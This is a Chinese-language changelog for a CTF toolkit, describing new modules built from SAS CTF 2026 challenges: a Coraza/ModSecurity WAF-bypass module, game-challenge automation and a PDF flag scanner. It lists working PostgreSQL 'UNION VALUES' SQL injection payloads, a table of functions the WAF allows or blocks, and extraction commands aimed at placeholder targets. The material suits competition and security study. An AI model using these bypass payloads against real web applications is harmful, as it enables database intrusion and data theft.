# CTF工具包更新日志

## 2026-06-07 基于SAS CTF 2026经验的重大更新

### 🎯 新增模块

#### 1. WAF绕过模块 (`waf_bypass.py`)

**功能**:
- Coraza/ModSecurity WAF检测与绕过
- `UNION VALUES` 完全绕过 `@detectSQLi`
- `left/right` 替代 `substring` 绕过
- WAF允许/拦截函数矩阵
- PL/pgSQL EXECUTE注入检测

**核心发现** (SAS CTF 2026 Gav题验证):
```sql
-- ✅ 完全绕过WAF
x' UNION VALUES(current_database())--
x' UNION VALUES(''||ASCII('A'))--  -- 返回65

-- ❌ 被拦截
x' UNION SELECT 'test'--           -- 403
```

**用法**:
```bash
# 检测WAF类型
python3 waf_bypass.py waf_detect <url>

# UNION VALUES绕过并提取数据
python3 waf_bypass.py union_values <url> <param> [expr]

# 检测游戏API
python3 waf_bypass.py game_api <url>

# 检测PDF泄露
python3 waf_bypass.py pdf_leak <pdf_path>
```

**技术细节**:
- Coraza WAF检查 `ARGS_NAMES|ARGS` (GET参数)
- **不检查** Cookie/POST body/Header/JSON body
- `UNION VALUES` 不在OWASP CRS检测规则中
- PostgreSQL原生支持 `SELECT ... UNION VALUES (...)` 语法

#### 2. 游戏题自动化模块 (`game_auto.py`)

**功能**:
- 游戏API端点自动发现
- 游戏状态获取与解析
- BFS自动寻路算法
- 自动收集星星
- Kernel代码生成器
- Sandbox限制检测

**基于Kolobok题验证**:
- API: `/game_state`, `/move_manual`, `/reset_game`, `/get_flag`
- 方向映射: 左(-1,0), 右(1,0), 上(0,-1), 下(0,1)
- 手动进入出口被拦截，需用kernel走最后一步

**用法**:
```bash
# 自动玩游戏
python3 game_auto.py auto <url>

# 获取游戏状态
python3 game_auto.py state <url>

# 移动
python3 game_auto.py move <url> <direction>

# 生成kernel
python3 game_auto.py kernel <direction>
```

**Kernel代码生成**:
```python
# 单步移动
def player_kernel(m, a, o):
    o[0] = 1  # 左

# 路径移动
def player_kernel(m, a, o):
    steps = [1, 2, 3, 4]
    for step in steps:
        o[0] = step

# 智能kernel (避开敌人，收集星星)
def player_kernel(m, a, o):
    # 查找玩家位置
    px = 0
    py = 0
    for y in range(9):
        for x in range(9):
            if m[y][x] == 80:
                px = x
                py = y
    # ... 寻找星星并移动
```

**Sandbox限制** (SAS CTF 2026验证):
- ❌ 禁止: `import`, `__name__`, `lambda`, `while`, `return`, `or`, `and`
- ❌ 禁止: `list()`, `type()`, `print()`, 三元表达式
- ✅ 允许: `for range`, `if`, `len`, 索引访问, `abs`, `%`, `//`

#### 3. 主引擎新增插件 (`engine.py`)

**Coraza WAF绕过插件** (`coraza_bypass`):
- 自动检测Coraza WAF
- 测试UNION VALUES绕过
- 提取数据库名等信息

**游戏API插件** (`game_api`):
- 发现游戏API端点
- 检测sandbox绕过
- 记录可直接调用的API

**PDF泄露插件** (`pdf_leak`):
- 扫描PDF文件
- 提取泄露的flag
- 支持多种flag格式

### 📊 WAF允许/拦截函数矩阵

**✅ 允许直接调用**:
- `current_database()`, `current_setting()`, `current_user`, `pg_backend_pid()`
- `trim()`, `upper()`, `lower()`, `reverse()`, `initcap()`
- `left()`, `right()` ← substring的替代品
- `ASCII()` ← 仅直接调用可用，子查询中被拦
- `set_config()`, `''||expr` 字符串拼接

**❌ 被拦截**:
- `substring()`, `replace()`, `regexp_replace()`, `translate()`
- `length()`, `char_length()`, `octet_length()`, `strpos()`, `position()`
- `overlay()`, `lpad()`, `rpad()`, `split_part()`
- `pg_read_file()`, `lo_import()`, `lo_from_bytea()`
- `dblink_connect()`, `dblink_exec()`
- `(SELECT ...)` 子查询, `CASE WHEN`

### 🔧 技术改进

1. **数据提取优化**:
   - 使用 `left(right(text,-N),1)` 替代 `substring()`
   - ASCII值转换: `''||ASCII(char)` 将字符转为数字
   - 逐字符提取避免WAF拦截

2. **游戏题策略**:
   - 优先使用API直接调用，绕过kernel sandbox
   - 手动进入出口被拦截，需用kernel走最后一步
   - BFS寻路 + 敌人回避

3. **PDF泄露检测**:
   - 支持多种PDF提取工具 (mutool/pdftotext/strings)
   - 多种flag格式匹配 (flag/FLAG/SAS/ctf/CTF/key/secret/token)
   - 批量扫描目录

### 📁 文件结构

```
ctf-toolkit/
├── engine.py           # 主引擎 (新增3个插件)
├── waf_bypass.py       # WAF绕过模块 (新增)
├── game_auto.py        # 游戏题自动化 (新增)
├── gui/                # 图形界面
├── web/                # Web模块
├── crypto/             # 密码学模块
├── pwn/                # PWN模块
├── reverse/            # 逆向模块
├── misc/               # Misc模块
├── recon/              # 侦察模块
├── defense/            # 防御模块
├── scripts/            # 脚本
├── payloads/           # Payload库
├── wordlists/          # 字典
└── loot/               # 战利品
```

### 🎓 使用示例

#### 示例1: Coraza WAF绕过
```bash
# 检测WAF
python3 waf_bypass.py waf_detect https://target.com/api

# 提取数据库名
python3 waf_bypass.py union_values https://target.com/api id current_database()

# 提取表名
python3 waf_bypass.py union_values https://target.com/api id \
  "(SELECT string_agg(table_name,',') FROM information_schema.tables)"
```

#### 示例2: 游戏题自动化
```bash
# 自动玩游戏
python3 game_auto.py auto https://game.ctf.com

# 生成单步kernel
python3 game_auto.py kernel 左

# 生成路径kernel
python3 game_auto.py kernel 路径 左右上下
```

#### 示例3: 主引擎集成
```bash
# 运行完整扫描
python3 engine.py https://target.com --mode full

# 只运行WAF绕过插件
python3 engine.py https://target.com --mode fast --web-only
```

### 🐛 已知问题与限制

1. **WAF绕过**:
   - 仅支持PostgreSQL (UNION VALUES语法)
   - 需要知道注入点参数名
   - 数字通道回显需要响应中包含数字

2. **游戏题自动化**:
   - 依赖API端点名称猜测
   - BFS寻路需要已知地图
   - Kernel sandbox限制因题而异

3. **PDF泄露**:
   - 依赖PDF文本提取质量
   - 可能误报 (非flag的类似格式文本)
   - 加密PDF无法提取

### 🔮 后续计划

1. **WAF绕过扩展**:
   - 支持更多DBMS (MySQL/MSSQL/SQLite)
   - 添加更多绕过技术 (注释/编码/分块)
   - 自动化payload生成

2. **游戏题增强**:
   - 支持更多游戏类型 (贪吃蛇/2048/迷宫)
   - 机器学习自动策略
   - 实时敌人追踪

3. **PDF分析增强**:
   - 支持加密PDF破解
   - 图片中的flag提取 (OCR)
   - 多语言flag支持

### 📚 参考资料

- **SAS CTF 2026经验**: `/root/.hermes/skills/penetration-testing-learning/ctf-playbook/references/sas-ctf-2026-patterns.md`
- **Coraza WAF文档**: https://coraza.io/docs/
- **OWASP CRS规则**: https://coreruleset.org/
- **PostgreSQL SQL注入**: https://www.postgresql.org/docs/current/sql-expressions.html

### 🏆 致谢

感谢SAS CTF 2026 Gav题和Kolobok题提供的实战验证机会!

---

**更新日期**: 2026-06-07  
**版本**: v6.1  
**作者**: CTF Automation Team
